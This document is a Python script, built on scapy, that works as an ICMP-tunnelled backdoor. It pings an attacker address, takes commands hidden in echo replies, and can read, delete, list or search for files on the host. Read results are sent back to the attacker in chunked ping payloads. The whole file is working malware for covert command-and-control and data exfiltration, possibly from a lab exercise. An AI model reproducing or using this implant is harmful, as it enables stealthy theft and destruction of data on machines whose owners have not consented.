import scapy.all as scapy
import os, fnmatch
import time
import random

MAX_DATA_SIZE = 512
ARE_YOU_CONNECTED_ID = 210
ASK_FOR_COMMAND_ID = 220
START_TRANSMISSION_ID = 240
ONGOING_TRANSMISSION_ID = 250
END_TRANSMISSION_ID = 255
FREQUENCY = 60 * 1  # 60s * 1 = 1 minute(s)
ATTACKER_IP_ADDR = "10.10.10.2"
DEFAULT_TIMEOUT = None
DEFAULT_PAYLOAD = b''


def send_ping(ip_addr, id, seq_number, payload, timeout, nb_responses=2):
    request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
    scapy.send(request)
    print("Sent packet:")
    print(request.show())
    return receive_response_packet(request, timeout, nb_responses)


def send_data(ip_addr, id, data):
    bytes_data = data.encode()
    data_length = len(bytes_data)
    print(f'Data length is {data_length}')
    number_of_packets_to_send = (data_length // MAX_DATA_SIZE) + 1

    if number_of_packets_to_send > 1:
        for index in range(0, number_of_packets_to_send):
            if index == number_of_packets_to_send - 1:
                remainder = data_length - (index * MAX_DATA_SIZE)
                data_part = bytes_data[-1 * remainder:]
            else:
                data_part = bytes_data[index * MAX_DATA_SIZE: ((index + 1) * MAX_DATA_SIZE)]
            send_ping(ip_addr, id, index, data_part, DEFAULT_TIMEOUT)
    else:
        send_ping(ip_addr, id, 0x0, bytes_data, DEFAULT_TIMEOUT)


def ask_for_command(ip_addr):
    response = send_ping(ip_addr, ASK_FOR_COMMAND_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT)
    return retrieve_command(response[1])


def accomplish_routine(ip_addr):
    command = ask_for_command(ip_addr)
    result = do_action(command)
    send_command_result(ip_addr, result)


def send_command_result(ip_addr, data):
    send_ping(ip_addr, START_TRANSMISSION_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT)
    send_data(ip_addr, ONGOING_TRANSMISSION_ID, data)
    send_ping(ip_addr, END_TRANSMISSION_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT)


def read_file_content(path):
    text_file = open(path, "r")
    data = text_file.read()
    text_file.close()
    print(data)
    return data


def retrieve_command(response):
    return response[scapy.ICMP].payload.load.decode("utf-8").split()  # forge_random_command().decode("utf-8").split()


def receive_response_packet(request, timeout, nb_responses):
    print("Start receiving packets")
    packets = []
    for index in range(nb_responses):
        packets.append(
            scapy.sniff(stop_filter=lambda response: match_response_to_request(response, request), count=1, timeout=timeout, prn=lambda packet: packet.summary()))
    print("Received packet:")
    print(packets[1].show())
    return packets[1]


def can_proceed(ip_addr):
    response = send_ping(ip_addr, ARE_YOU_CONNECTED_ID, 0x0, b'', DEFAULT_TIMEOUT)
    return True


def match_response_to_request(response, request):
    # print(response.show(), request.show())
    return response.haslayer(scapy.ICMP) \
        and response[scapy.IP].src == request[scapy.IP].dst \
        and response[scapy.IP].dst == request[scapy.IP].src \
        and response[scapy.ICMP] and response[scapy.ICMP].type == 0 \
        and response[scapy.ICMP].id == request[scapy.ICMP].id \
        and response[scapy.ICMP].seq == request[scapy.ICMP].seq


def list_directory(path):
    return ";".join(os.listdir(path))


def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result


def do_action(command):
    result = ""
    action = command[0]
    parameter = command[1]

    if action == "200":
        print(f"Read file: {parameter}")
        result = read_file_content(parameter)
    elif action == "300":
        print(f"Delete file: {parameter}")
        os.remove(parameter)
        result = f"{parameter} removed successfully"
    elif action == "400":
        print(f"List path: {parameter}")
        result = list_directory(parameter)
    elif action == "500":
        print(f"Locate filemane: {parameter}")
        results = find(parameter, './')
        result = ";".join(results)
    print(result)
    return result


def forge_random_command():
    command = b'200 ./data.txt'
    choice = random.randint(1, 4)
    if choice == 1:
        command = b'300 ./data1.txt'
    elif choice == 2:
        command = b'400 ./'
    elif choice == 3:
        command = b'500 data.txt'
    return command


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    # while True:
    # try:
    if can_proceed(ATTACKER_IP_ADDR):
        accomplish_routine(ATTACKER_IP_ADDR)
        # except Exception as err:
        # print(f"Unexpected {err=}, {type(err)=}")
        # else:
        #    print("Nothing went wrong!")
        # finally:
        #    print(f"See you in {FREQUENCY} min(s)")
    time.sleep(FREQUENCY)
